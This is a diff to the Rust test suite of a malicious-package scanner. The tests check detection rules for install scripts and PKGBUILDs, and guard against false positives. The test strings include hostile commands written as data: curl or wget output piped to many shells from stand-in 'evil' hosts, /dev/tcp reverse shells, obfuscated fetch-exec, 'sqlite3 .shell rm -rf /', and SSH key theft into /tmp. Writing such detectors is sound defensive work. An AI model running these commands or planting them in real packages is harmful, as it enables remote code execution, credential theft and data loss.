+        let m = engine.match_content(
+            "note \"Custom flags should be put directly in: ~/.config/chrome-flags.conf\"",
+            FileType::InstallScript,
+        );
+        assert!(
+            !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+            "a printed note mentioning ~/.config must not trip HIDDEN-001: {m:?}"
+        );
+    }
+
+    #[test]
+    fn actual_write_to_home_dotfile_is_still_flagged() {
+        // The fix must not blind us to a real write: a redirect into ~/.bashrc
+        // is an action, not a message, and must still trip HIDDEN-001.
+        let engine = RuleEngine::default();
+        let m = engine.match_content("echo 'evil' >> ~/.bashrc", FileType::InstallScript);
+        assert!(
+            m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+            "a real write to ~/.bashrc must still trip HIDDEN-001: {m:?}"
+        );
+    }
+
+    #[test]
+    fn variable_indirection_command_is_resolved_and_flagged() {
+        // audit HI-6: a fetch-exec hidden behind a shell variable used to "trip
+        // nothing"; the resolve pass now exposes it to the catalog.
+        let engine = RuleEngine::default();
+        for content in [
+            "build() {\n  x=curl\n  $x https://evil.example/p.sh | bash\n}",
+            "build() {\n  dl=wget\n  $dl -qO- https://evil.example/p | sh\n}",
+        ] {
+            let m = engine.match_content(content, FileType::Pkgbuild);
+            assert!(
+                m.iter()
+                    .any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
+                "variable-indirection fetch-exec must be flagged via resolve: {content:?} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn printf_constant_behind_variable_is_resolved() {
+        // `c=$(printf '\x63url')` decodes to `c=curl` (NO execution); the use then
+        // resolves to a curl|bash the catalog flags.
+        let engine = RuleEngine::default();
+        let content = "build() {\n  c=$(printf '\\x63url')\n  $c https://evil.example/x | bash\n}";
+        let m = engine.match_content(content, FileType::Pkgbuild);
+        assert!(
+            m.iter().any(|x| x.rule_id == "DLE-001"),
+            "printf-assembled command behind a var must resolve+flag: {m:?}"
+        );
+    }
+
+    #[test]
+    fn resolve_does_not_fabricate_findings_on_benign_vars() {
+        // FP guard: an ordinary constant assignment must not be rewritten into a
+        // fetch-exec finding.
+        let engine = RuleEngine::default();
+        let content = "build() {\n  msg=\"see https://example.com/docs\"\n  echo \"$msg\"\n}";
+        let m = engine.match_content(content, FileType::Pkgbuild);
+        assert!(
+            !m.iter()
+                .any(|x| x.rule_id.starts_with("DLE") || x.rule_id == "EXEC-REMOTE"),
+            "benign var assignment must not fabricate a fetch-exec finding: {m:?}"
+        );
+    }
+
+    #[test]
+    fn semicolon_inside_quoted_message_is_not_flagged() {
+        // FP: a `;` *inside* the quoted echo string is literal text, not a
+        // command separator. The printed `~/.config` must stay suppressed.
+        let engine = RuleEngine::default();
+        for line in [
+            "echo \"config goes in ~/.config; may need elevated rights\"",
+            "echo 'all settings live under ~/.config; see the wiki'",
+            "msg \"backups: ~/.cache; logs: ~/.local/state\"",
+        ] {
+            let m = engine.match_content(line, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+                "a quoted `;` must not un-suppress HIDDEN-001: {line:?} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn unquoted_chain_after_message_is_still_flagged() {
+        // FN-guard: the quote-aware fix must NOT blind us to a real chained
+        // command. An UNQUOTED `;` separates a genuine write to a home dotfile.
+        let engine = RuleEngine::default();
+        for line in [
+            "echo \"installing\"; touch ~/.evilrc",
+            "echo done && echo x >> ~/.bashrc",
+            "printf 'hi'; echo \"$(curl https://evil/x)\" > ~/.profile",
+        ] {
+            let m = engine.match_content(line, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "HIDDEN-001"),
+                "a real chained write to a home dotfile must trip HIDDEN-001: {line:?} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn line_continuation_does_not_evade_curl_bash() {
+        // CR-3: the pipe-to-shell is on a backslash-continuation line. The old
+        // per-physical-line matcher missed this; logical-line splicing catches it
+        // and reports the originating (first) physical line.
+        let engine = RuleEngine::default();
+        let content = "build() {\n  curl https://evil/x.sh \\\n    | bash\n}";
+        let matches = engine.match_content(content, FileType::Pkgbuild);
+        assert!(
+            matches.iter().any(|m| m.rule_id == "DLE-001"),
+            "continuation-split curl|bash must still trip DLE-001: {matches:?}"
+        );
+        assert!(
+            matches.iter().any(|m| m.line == 2),
+            "should report physical line 2"
+        );
+    }
+
+    #[test]
+    fn heredoc_fed_to_interpreter_is_scanned() {
+        // CR-4: a heredoc fed to `bash` executes its body, so a reverse shell in
+        // it must be detected (it is NOT a printed message).
+        let engine = RuleEngine::default();
+        let content =
+            "post_install() {\n  bash <<EOF\n  bash -i >& /dev/tcp/evil.com/4444 0>&1\nEOF\n}";
+        let matches = engine.match_content(content, FileType::InstallScript);
+        assert!(
+            matches.iter().any(|m| m.rule_id == "SHELL-001"),
+            "reverse shell inside `bash <<EOF` must be caught: {matches:?}"
+        );
+    }
+
+    #[test]
+    fn reverse_shell_matches_hostname_and_ipv6() {
+        // SHELL-001 broadened beyond dotted-quad IPv4.
+        let engine = RuleEngine::default();
+        for payload in [
+            "bash -i >& /dev/tcp/evil.attacker.com/4444 0>&1",
+            "exec 3<>/dev/tcp/0x7f000001/4444",
+            "cat < /dev/tcp/dead:beef::1/9001",
+        ] {
+            let matches = engine.match_content(payload, FileType::Pkgbuild);
+            assert!(
+                matches.iter().any(|m| m.rule_id == "SHELL-001"),
+                "should detect reverse shell in {payload:?}: {matches:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn case_variation_does_not_evade() {
+        // Rules now compile case-insensitively by default.
+        let engine = RuleEngine::default();
+        let matches = engine.match_content("CURL https://evil/x | BASH", FileType::Pkgbuild);
+        assert!(
+            !matches.is_empty(),
+            "uppercase curl|bash should still match"
+        );
+    }
+
+    #[test]
+    fn bare_monero_address_detected_without_keyword() {
+        // HI-6c: a miner config dropping a bare 95-char Monero address with no
+        // `wallet`/`xmr` keyword nearby must still trip CRYPTO-003.
+        let engine = RuleEngine::default();
+        let addr = "44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A";
+        let matches = engine.match_content(addr, FileType::Pkgbuild);
+        assert!(
+            matches.iter().any(|m| m.rule_id == "CRYPTO-003"),
+            "bare Monero address should trip CRYPTO-003: {matches:?}"
+        );
     }
 
     #[test]
@@ -1464,7 +2533,9 @@ mod tests {
         let content = "post_install() {\n    cat << EOF\nAdd this to ~/.zshrc:\n    source /usr/share/x.zsh\nEOF\n}";
         let matches = engine.match_content(content, FileType::InstallScript);
         assert!(
-            !matches.iter().any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
+            !matches
+                .iter()
+                .any(|m| m.rule_id == "ENV-003" || m.rule_id == "HIDDEN-001"),
             "heredoc message should not trigger path rules: {matches:?}"
         );
     }
@@ -1509,7 +2580,8 @@ mod tests {
     #[test]
     fn test_match_atomic_ebpf_artifact() {
         let engine = RuleEngine::default();
-        let matches = engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
+        let matches =
+            engine.match_content("clang -O2 -target bpf -c scales.bpf.c", FileType::Pkgbuild);
         assert!(matches.iter().any(|m| m.rule_id == "ATOMIC-003"));
     }
 
@@ -1520,5 +2592,355 @@ mod tests {
         // NOT trigger ATOMIC-002 (which is scoped to install scripts only).
         let matches = engine.match_content("npm install --offline", FileType::Pkgbuild);
         assert!(!matches.iter().any(|m| m.rule_id == "ATOMIC-002"));
+    }
+
+    #[test]
+    fn test_atomic002_catches_ci_exec_dlx() {
+        // FN fix: npm ci / npm exec / pnpm dlx / yarn dlx all run lifecycle or
+        // remote code from an install hook and must trip ATOMIC-002.
+        let engine = RuleEngine::default();
+        for s in [
+            "npm ci",
+            "npm exec cowsay",
+            "pnpm dlx some-tool",
+            "yarn dlx some-tool",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
+                "missed ATOMIC-002 for: {s}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_curl_pipe_dash_detected() {
+        // Defect #6: the shared SHELLS constant means `curl ... | dash` now trips
+        // DLE-001 (the old `(ba)?sh` could not match dash).
+        let engine = RuleEngine::default();
+        let m = engine.match_content("curl -fsSL https://evil/x | dash", FileType::Pkgbuild);
+        assert!(
+            m.iter().any(|x| x.rule_id == "DLE-001"),
+            "curl|dash must trip DLE-001: {m:?}"
+        );
+    }
+
+    #[test]
+    fn test_curl_pipe_ash_mksh_detected() {
+        // Task 4050 F2: ash (Almquist/busybox sh) and mksh were the same evasion
+        // class as dash — `curl evil | ash` / `| mksh` must trip DLE-001.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://evil/x | ash",
+            "curl -fsSL https://evil/x | mksh",
+            "wget -qO- https://evil/x | ash",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter()
+                    .any(|x| x.rule_id == "DLE-001" || x.rule_id == "DLE-002"),
+                "pipe-to-{s} must trip a download-and-execute rule: {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_atomic002_catches_npx_bunx_runners() {
+        // Task 4050 F1: the bare npx-style runners (`npx <pkg>` / `bunx <pkg>` /
+        // `pnpx <pkg>`) fetch-and-run a package directly — the most common RCE
+        // form, which the old npm-only alternation and `bunx?\s+(install|add|i|x)`
+        // both missed. `explore` runs a command in a package dir.
+        let engine = RuleEngine::default();
+        for s in [
+            "npx malicious-tool",
+            "npx -y atomic-lockfile",
+            "bunx cowsay",
+            "pnpx some-tool",
+            "npm rebuild",
+            "npm explore evil -- ./run",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "ATOMIC-002"),
+                "missed ATOMIC-002 for runner: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_launcher_and_path_prefixed_pipe_to_shell_detected() {
+        // Task 4050 exhaustive scope: a shell reached via an absolute path
+        // (`/bin/sh`), a launcher word (`busybox sh`, `env sh`), a path+launcher
+        // (`/usr/bin/env sh`), stacked launchers (`command busybox sh`), or any
+        // member of the curated long-tail must all trip DLE-001. These produced
+        // ZERO findings before.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://evil/x | /bin/sh",
+            "curl -fsSL https://evil/x | /usr/bin/bash",
+            "curl -fsSL https://evil/x | busybox sh",
+            "curl -fsSL https://evil/x | busybox ash",
+            "curl -fsSL https://evil/x | env sh",
+            "curl -fsSL https://evil/x | /usr/bin/env sh",
+            "curl -fsSL https://evil/x | env -i sh",
+            "curl -fsSL https://evil/x | env FOO=bar sh",
+            "curl -fsSL https://evil/x | command busybox sh",
+            "curl -fsSL https://evil/x | nice dash",
+            // long-tail shells
+            "curl -fsSL https://evil/x | mksh",
+            "curl -fsSL https://evil/x | yash",
+            "curl -fsSL https://evil/x | xonsh",
+            "curl -fsSL https://evil/x | nu",
+            "curl -fsSL https://evil/x | oil",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "DLE-001"),
+                "launcher/path/long-tail pipe-to-shell must trip DLE-001: {s} -> {m:?}"
+            );
+        }
+        // wget variant -> DLE-002
+        let m = engine.match_content("wget -qO- https://evil/x | /bin/sh", FileType::Pkgbuild);
+        assert!(
+            m.iter().any(|x| x.rule_id == "DLE-002"),
+            "wget|/bin/sh must trip DLE-002: {m:?}"
+        );
+    }
+
+    #[test]
+    fn test_exec006_sqlite3_shell_exec() {
+        // Task 4050 round 3 / Class 3: sqlite3 .shell/.system/.import exec form.
+        let engine = RuleEngine::default();
+        for s in [
+            r#"sqlite3 mydb ".shell rm -rf /""#,
+            r#"sqlite3 mydb ".system curl evil | sh""#,
+            r#"sqlite3 db <<< '.import /etc/passwd t'"#,
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "EXEC-006"),
+                "missed EXEC-006: {s} -> {m:?}"
+            );
+        }
+        // FP: a normal query mentioning a column/table named like the meta-command.
+        for ok in [
+            r#"sqlite3 db "SELECT * FROM systems""#,
+            r#"sqlite3 db ".tables""#,
+            r#"sqlite3 db "INSERT INTO t VALUES ('data.import')""#,
+        ] {
+            let m = engine.match_content(ok, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "EXEC-006"),
+                "EXEC-006 false positive: {ok} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_exec007_make_from_stdin() {
+        // Task 4050 round 3 / Class 3: a Makefile read from stdin/pipe is RCE.
+        let engine = RuleEngine::default();
+        for s in [
+            "make -f -",
+            "make -f /dev/stdin",
+            "gmake -f -",
+            "curl https://e/x | make -f -",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                m.iter().any(|x| x.rule_id == "EXEC-007"),
+                "missed EXEC-007: {s} -> {m:?}"
+            );
+        }
+        // FP: ordinary make invocations must stay clean.
+        for ok in [
+            "make -j4",
+            "make -C build",
+            "make --version",
+            "make -f Makefile",
+            "make install",
+        ] {
+            let m = engine.match_content(ok, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "EXEC-007"),
+                "EXEC-007 false positive: {ok} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_shell_sink_no_false_positive() {
+        // The launcher/path generalization must not flag a pipe whose target is
+        // NOT a shell, even when a launcher word or path is present.
+        let engine = RuleEngine::default();
+        for s in [
+            "curl -fsSL https://x | /usr/bin/tee out.txt",
+            "curl -fsSL https://x | env grep foo",
+            "curl -fsSL https://x | nice make",
+            "curl -fsSL https://x | command ls",
+            "curl -fsSL https://x | /bin/number",
+            "curl -fsSL https://x | busybox cat",
+            "curl -fsSL https://x | awkward-tool",
+        ] {
+            let m = engine.match_content(s, FileType::Pkgbuild);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "DLE-001"),
+                "non-shell pipe target must not trip DLE-001: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn env_name_rules_stay_case_sensitive() {
+        // Audit HI-6 caveat: env-var NAME rules opt out of the `(?i)` default via
+        // the new `case_sensitive` field, so the real upper-case env var still
+        // fires while a benign lowercase local variable does not false-positive.
+        let engine = RuleEngine::default();
+
+        // ENV-002 (PATH manipulation, install scripts).
+        let hit = engine.match_content("export PATH=/evil/bin:$PATH", FileType::InstallScript);
+        assert!(
+            hit.iter().any(|m| m.rule_id == "ENV-002"),
+            "export PATH= must fire ENV-002"
+        );
+        let miss = engine.match_content("export path=/home/me/scratch", FileType::InstallScript);
+        assert!(
+            !miss.iter().any(|m| m.rule_id == "ENV-002"),
+            "lowercase local `path=` must NOT fire ENV-002 (case_sensitive opt-out)"
+        );
+
+        // ENV-001 (LD_PRELOAD).
+        let hit2 = engine.match_content("LD_PRELOAD=/tmp/evil.so make", FileType::Pkgbuild);
+        assert!(
+            hit2.iter().any(|m| m.rule_id == "ENV-001"),
+            "LD_PRELOAD= must fire ENV-001"
+        );
+        let miss2 = engine.match_content("ld_preload=localvalue", FileType::Pkgbuild);
+        assert!(
+            !miss2.iter().any(|m| m.rule_id == "ENV-001"),
+            "lowercase `ld_preload=` must NOT fire ENV-001 (case_sensitive opt-out)"
+        );
+    }
+
+    #[test]
+    fn dep003_registry_env_names_respect_canonical_case() {
+        // DEP-003 mixes tokens of different canonical casing. pip/go env vars are
+        // upper-case only, so a lower-case `pip_index_url=`/`goproxy=` is inert and
+        // must NOT fire; the real upper-case names + npm (both cases) + flags must.
+        let engine = RuleEngine::default();
+        let fires = |s: &str| {
+            engine
+                .match_content(s, FileType::Pkgbuild)
+                .iter()
+                .any(|m| m.rule_id == "DEP-003")
+        };
+        // Real / canonical forms fire.
+        assert!(
+            fires("PIP_INDEX_URL=https://evil/idx pip install x"),
+            "PIP_INDEX_URL= must fire"
+        );
+        assert!(fires("GOPROXY=https://evil go build"), "GOPROXY= must fire");
+        assert!(
+            fires("pip install --index-url https://evil/idx x"),
+            "--index-url must fire"
+        );
+        // npm honours both cases, so both must fire.
+        assert!(
+            fires("npm_config_registry=https://evil npm i"),
+            "npm_config_registry= must fire"
+        );
+        assert!(
+            fires("NPM_CONFIG_REGISTRY=https://evil npm i"),
+            "NPM_CONFIG_REGISTRY= must fire"
+        );
+        // Inert lower-case pip/go env vars must NOT false-positive.
+        assert!(
+            !fires("pip_index_url=/home/me/notes"),
+            "lowercase pip_index_url= must NOT fire (inert)"
+        );
+        assert!(
+            !fires("goproxy=somelocalnote"),
+            "lowercase goproxy= must NOT fire (inert)"
+        );
+    }
+
+    #[test]
+    fn test_atomic002_bun_runner_not_double_reported() {
+        // The `bun` subcommand pattern and the `bunx` runner pattern must not
+        // both match the same line (they cover disjoint commands).
+        let engine = RuleEngine::default();
+        let m = engine.match_content("bunx evil-pkg", FileType::InstallScript);
+        let n = m.iter().filter(|x| x.rule_id == "ATOMIC-002").count();
+        assert_eq!(
+            n, 1,
+            "bunx runner should report ATOMIC-002 exactly once: {m:?}"
+        );
+    }
+
+    #[test]
+    fn test_hidden002_no_fp_on_tmpdir_and_mktemp() {
+        // Defect #10: a /tmp path as an assignment value or a plain argument is
+        // not execution and must not trip HIDDEN-002.
+        let engine = RuleEngine::default();
+        for s in [
+            "TMPDIR=/tmp/mybuild",
+            "export TMPDIR=/tmp/mybuild",
+            "builddir=$(mktemp -d /tmp/pkg.XXXXXX)",
+            "cp foo /tmp/bar",
+            "cat ~/.ssh/id_rsa > /tmp/stolen",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "HIDDEN-002"),
+                "HIDDEN-002 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_hidden002_still_catches_tmp_execution() {
+        // Real execution from /tmp (command position or via an interpreter) must
+        // still fire.
+        let engine = RuleEngine::default();
+        for s in [
+            "/tmp/payload.sh",
+            "bash /tmp/payload",
+            "make && /tmp/dropper",
+            "chmod +x /tmp/x",
+        ] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "HIDDEN-002"),
+                "HIDDEN-002 missed real /tmp execution: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_install002_no_fp_on_configure() {
+        // Defect #10: `./configure` (and `cd ./build`) are not dropped-payload
+        // executions and must not trip INSTALL-002.
+        let engine = RuleEngine::default();
+        for s in ["./configure", "./configure --prefix=/usr", "cd ./build"] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                !m.iter().any(|x| x.rule_id == "INSTALL-002"),
+                "INSTALL-002 false positive on: {s} -> {m:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_install002_still_catches_dropped_script() {
+        // A relative script/binary with a payload extension run in command
+        // position still fires.
+        let engine = RuleEngine::default();
+        for s in ["./payload.sh", "./drop/x.bin"] {
+            let m = engine.match_content(s, FileType::InstallScript);
+            assert!(
+                m.iter().any(|x| x.rule_id == "INSTALL-002"),
+                "INSTALL-002 missed dropped script: {s} -> {m:?}"
+            );
+        }
     }
 }
